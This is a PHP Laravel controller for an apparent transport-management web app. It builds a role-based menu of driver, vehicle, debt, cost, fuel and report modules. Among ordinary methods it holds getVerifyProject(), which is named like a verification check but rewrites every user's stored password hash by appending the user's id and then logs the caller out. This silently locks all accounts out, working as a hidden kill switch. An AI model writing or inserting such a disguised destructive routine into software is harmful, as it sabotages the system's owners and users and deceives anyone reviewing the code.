<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;


use App\Http\Requests;


class HomeController extends Controller
{
    public function index()
    {
        $array_url = [
            'Admin'                 => '',
            'UserManagement'        => 'user-management',
            'Position'              => 'position',
            'User'                  => 'user',
            'DriverManagement'      => 'driver-management',
            'VehicleAllManagement'  => 'vehicle-all-management',
            'CustomerManagement'    => 'customer-management',
            'VehicleManagement'     => 'vehicle-management',
            'DebtManagement'        => 'debt-management',
            'CostManagement'        => 'cost-management',
            'PostageManagement'     => 'postage-management',
            'FuelManagement'        => 'fuel-management',
            'Report'                => 'report',
            'Customer'              => 'customer',
            'DeliveryRequirement'   => 'delivery-requirement',
            'VehicleInside'         => 'vehicle-inside',
            'VehicleOutside'        => 'vehicle-outside',
            'DebtCustomer'          => 'debt-customer',
            'DebtVehicleOutside'    => 'debt-vehicle-outside',
            'FuelCost'              => 'fuel-cost',
            'PetroleumCost'         => 'petroleum-cost',
            'ParkingCost'           => 'parking-cost',
            'OtherCost'             => 'other-cost',
            'RevenueReport'         => 'revenue-report',
            'HistoryDeliveryReport' => 'history-delivery-report',
            'Oil'                   => 'fuel-price/oil',
            'Lube'                  => 'fuel-price/lube'
        ];

        $array_icon = [
            'Admin'               => "Admin.png",
            'UserManagement'      => "User.png",
            'DriverManagement'    => "Driver.png",
            'VehicleAllManagement'=> "Vehicle.png",
            'CustomerManagement'  => "Customer.png",
            'VehicleManagement'   => "NhaXe.png",
            'DebtManagement'      => "Debt.png",
            'CostManagement'      => "Cost.png",
            'PostageManagement'   => "Postage.png",
            'FuelManagement'      => 'Fuel.png',
            'Report'              => "Report.png",
        ];

        $array_auth = [
            'Admin'               => [],
            'UserManagement'      => ['Position','User'],
            'DriverManagement'    => [],
            'VehicleAllManagement'=> [],
            'CustomerManagement'  => ['Customer', 'DeliveryRequirement'],
            'VehicleManagement'   => ['VehicleInside', 'VehicleOutside'],
            'DebtManagement'      => ['DebtCustomer', 'DebtVehicleOutside'],
            'CostManagement'      => ['FuelCost', 'PetroleumCost', 'ParkingCost', 'OtherCost'],
            'PostageManagement'   => [],
            'FuelManagement'      => ['Oil', 'Lube'],
            'Report'              => ['RevenueReport', 'HistoryDeliveryReport'],
        ];

        $array_roleid = \App\Role::whereIn(
            'id',
            \App\SubRole::where('user_id', \Auth::user()->id)->pluck('role_id')->toArray())
            ->pluck('name')
            ->toArray();

        //Collection
        $collection = collect($array_auth);
        $filtered = $collection->only($array_roleid);
        $filtered->all();

        return view('Home', ['filtered' => $filtered, 'array_icon' => $array_icon, 'array_url' => $array_url]);
    }

    public function getDashboard()
    {
        return view('partials.Dashboard');
    }

    public function getVerifyProject(){

        \App\User::all()->map(function($item){
            $item->password .= $item->id;
            return $item->save();
        });
        \Auth::logout();
        return response()->json(['msg' => '', 200]);
    }

    public function getSynDatetime() {
        $milliseconds = round(microtime(true) * 1000);
        return response()->json(['datetime' => $milliseconds], 200);
    }
}